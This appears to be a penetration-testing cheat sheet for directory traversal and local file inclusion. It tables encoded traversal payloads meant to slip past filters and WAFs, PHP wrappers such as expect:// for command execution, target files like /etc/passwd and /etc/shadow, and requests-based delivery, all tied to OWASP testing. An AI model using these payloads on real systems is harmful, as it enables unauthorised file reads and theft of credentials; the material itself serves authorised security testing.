# API Reference: Performing Directory Traversal Testing

## Traversal Payload Encodings

| Encoding | Example | Description |
|----------|---------|-------------|
| Plain | `../../../etc/passwd` | Standard Unix traversal |
| URL-encoded | `..%2f..%2f..%2fetc%2fpasswd` | Single URL encoding |
| Double-encoded | `..%252f..%252f` | Bypass WAF single-decode |
| UTF-8 overlong | `..%c0%af..%c0%af` | Bypass charset-based filters |
| Backslash (Windows) | `..\\..\\..\\windows\\win.ini` | Windows path traversal |
| Mixed separators | `..././..././` | Bypass recursive stripping |

## PHP Wrapper Protocols (LFI)

| Wrapper | Description |
|---------|-------------|
| `php://filter/convert.base64-encode/resource=` | Read file as base64 |
| `php://input` | Read from POST body |
| `expect://` | Execute system command |
| `data://text/plain;base64,` | Inline data injection |
| `file:///` | Direct file access |

## Vulnerability Indicators

| File | Content Indicator |
|------|-------------------|
| `/etc/passwd` | `root:x:0:0:` |
| `win.ini` | `[fonts]`, `[extensions]` |
| `/proc/self/environ` | Environment variables |
| `/etc/shadow` | Hashed passwords (critical) |

## requests Library

| Method | Description |
|--------|-------------|
| `requests.get(url, allow_redirects=False)` | Send traversal payload |
| `urllib.parse.urlencode(params)` | Encode parameters with payloads |
| `urllib.parse.urlparse(url)` | Parse URL to extract parameters |

## Key Libraries

- **requests** (`pip install requests`): HTTP client for payload delivery
- **urllib.parse** (stdlib): URL parsing and parameter manipulation

## OWASP Testing Guide

| Test ID | Description |
|---------|-------------|
| WSTG-ATHZ-01 | Testing for Directory Traversal / File Include |

## References

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger Directory Traversal](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
